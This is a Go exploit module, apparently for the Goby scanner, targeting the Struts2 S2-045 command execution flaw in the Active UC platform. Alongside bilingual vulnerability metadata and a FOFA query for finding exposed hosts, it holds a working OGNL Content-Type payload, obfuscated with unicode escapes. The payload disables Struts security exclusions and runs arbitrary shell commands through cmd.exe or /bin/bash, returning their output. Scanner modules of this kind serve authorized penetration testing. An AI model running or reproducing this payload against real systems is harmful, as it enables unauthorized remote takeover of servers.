package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Active UC index.action S2-045 RCE",
    "Description": "Active UC index.action has a vulnerability in S2-045 remote command execution on the unified communications platform Active UC. Through the vulnerability, arbitrary commands can be executed.",
    "Impact": "Active UC index.action S2-045 RCE",
    "Recommendation": "<p>The official has not fixed this vulnerability yet, please contact the manufacturer to fix the vulnerability: <a href=\"http://www.iactive.com.cn\">http:/ /www.iactive.com.cn</a></p><p>1. If not necessary, it is forbidden to access the device from the public network. </p><p>2. Set access policies and whitelist access through firewalls and other security devices</p>",
    "Product": "Active-UC",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "网动统一通信平台 Active UC index.action 远程命令执行漏洞",
            "Description": "<p>Active uc是一款深受用户喜爱的多媒体视频会议办公软件，支持35%网络丢包恢复，集群式服务器架构，支持无限量用户扩容，稳定运行超过一万小时业内纪录保持者，拥有 CD级语音质量，100~200Kbps网络占用可达到DVD级视频效果。</p><p>网动统一通信平台 Active UC存在远程命令执行漏洞，通过构造http请求，攻击者可以在服务器端任意执⾏代码，写⼊后⻔，获取服务器权限，进⽽控制整个web服务器。</p>",
            "Impact": "<p>网动统一通信平台 Active UC存在远程命令执行漏洞，通过构造http请求，攻击者可以在服务器端任意执⾏代码，写⼊后⻔，获取服务器权限，进⽽控制整个web服务器。</p>",
            "Recommendation": "<p>官⽅暂未修复该漏洞，请⽤户联系⼚商修复漏洞：<a href=\"http://www.iactive.com.cn\" rel=\"nofollow\">http://www.iactive.com.cn</a><br></p><p>1、如⾮必要，禁⽌公⽹访问该设备。</p><p>2、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问<br><br></p>",
            "Product": "网动统一通信平台(Active-UC)",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Active UC index.action S2-045 RCE",
            "Description": "Active UC index.action has a vulnerability in S2-045 remote command execution on the unified communications platform Active UC. Through the vulnerability, arbitrary commands can be executed.",
            "Impact": "Active UC index.action S2-045 RCE",
            "Recommendation": "<p>The official has not fixed this vulnerability yet, please contact the manufacturer to fix the vulnerability: <a href=\"http://www.iactive.com.cn\" rel=\"nofollow\">http:/ /www.iactive.com.cn</a><br></p><p>1. If not necessary, it is forbidden to access the device from the public network. </p><p>2. Set access policies and whitelist access through firewalls and other security devices<br><br></p>",
            "Product": "Active-UC",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "title=\"网动统一通信平台(Active UC)\"",
    "GobyQuery": "title=\"网动统一通信平台(Active UC)\"",
    "Author": "gp827782797@qq.com",
    "Homepage": "http://www.wangdong.cn/",
    "DisclosureDate": "2021-07-13",
    "References": [
        "http://wiki.peiqi.tech/PeiQi_Wiki/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Active%20UC/Active%20UC%20index.action%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html?h=Active%20UC%20index.action"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": [
            "Iactive-Cloud-video-platform"
        ]
    },
    "PocId": "9687"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			cfg := httpclient.NewPostRequestConfig("/acenter/index.action")
			cfg.Header.Store("Content-Type", "%{#context['com.opensymphony.xwo\\u0072k2.dispatche\\u0072.HttpSe\\u0072vletResponse'].addHeade\\u0072('Vul',2768*8799)}.multipart/form-data")
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(hostinfo, cfg); err == nil && strings.Contains(resp.Header.Get("Vul"), "24355632") {
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := stepLogs.Params["cmd"].(string)
			cfg := httpclient.NewPostRequestConfig("/acenter/index.action")
			cfg.Header.Store("Content-Type", fmt.Sprintf("%%{(#nike='multipart/form-data').(#dm=@\\u006fgnl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwo\\u0072k2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.\\u006fgnl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='%s').(#iswin=(@java.lang.System@getP\\u0072operty('os.name').t\\u006fLowe\\u0072Case().c\\u006fntains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.P\\u0072ocessBuilder(#cmds)).(#p.redirectEr\\u0072orStream(true)).(#process=#p.start()).(#ros=(@\\u006frg.apache.struts2.Se\\u0072vletActi\\u006fnContext@getResponse().getOutputStream())).(@org.apache.comm\\u006fns.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())};", cmd))
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				expResult.Success = true
				expResult.Output = resp.Utf8Html
				return expResult
			}
			return expResult
		},
	))
}
